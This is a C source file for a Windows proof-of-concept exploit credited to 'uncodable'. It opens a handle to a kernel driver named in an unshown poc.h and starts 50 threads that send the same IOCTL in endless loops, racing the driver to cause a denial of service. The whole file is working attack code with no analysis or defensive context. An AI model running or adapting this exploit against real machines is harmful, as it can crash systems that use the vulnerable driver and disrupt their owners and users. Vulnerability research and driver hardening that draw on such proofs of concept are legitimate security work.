#pragma warning(disable : 6273)

#include "poc.h"

DWORD WINAPI ioctl_thread(LPVOID id)
{
	HANDLE driver_handle = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	if (driver_handle == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a handle to the \"%s\" driver. Handle Value: 0x%p (%d), Error: 0x%x (%d)", TARGET_DEVICE, driver_handle, driver_handle, TARGET_IOCTL, TARGET_IOCTL);
		return 1;
	}

	printf("\n[*] Thread ID %d launched successfully.", (int)id);

	while (1)
	{
		DeviceIoControl(driver_handle, TARGET_IOCTL, 0, 0, 0, 0, 0, 0);
	}

	return 0;
}

int main(int argc, char** argv)
{
	HANDLE driver_handle = CreateFileA(TARGET_DEVICE, GENERIC_READ | GENERIC_WRITE, 0, 0, OPEN_EXISTING, 0, 0);
	char unused = 0;

	printf("[!] Exploit written by uncodable.\n[!] Target Device Driver Symbolic Link: %s\n[!] Target IO Control Code: 0x%x (%d)\n[!] Beginning denial-of-service exploit...", TARGET_DEVICE, TARGET_IOCTL, TARGET_IOCTL);

	if (driver_handle == (HANDLE)-1)
	{
		printf("\n[-] Unable to obtain a handle to the \"%s\" driver. Handle Value: 0x%p (%d), Error: 0x%x (%d)", TARGET_DEVICE, driver_handle, driver_handle, TARGET_IOCTL, TARGET_IOCTL);
		unused = getchar();
		return 1;
	}
	printf("\n[+] Obtained a handle to the \"%s\" driver. Handle Value: 0x%p (%d)\n[!] Spinning up threads, ready to race!", TARGET_DEVICE, driver_handle, driver_handle);
	
	CloseHandle(driver_handle);

	for (int i = 0; i < 50; i++)
	{
		CreateThread(NULL, 0, ioctl_thread, i, 0, NULL);
	}

	printf("\n[!] It's racing time!");
	unused = getchar();

	return 0;
}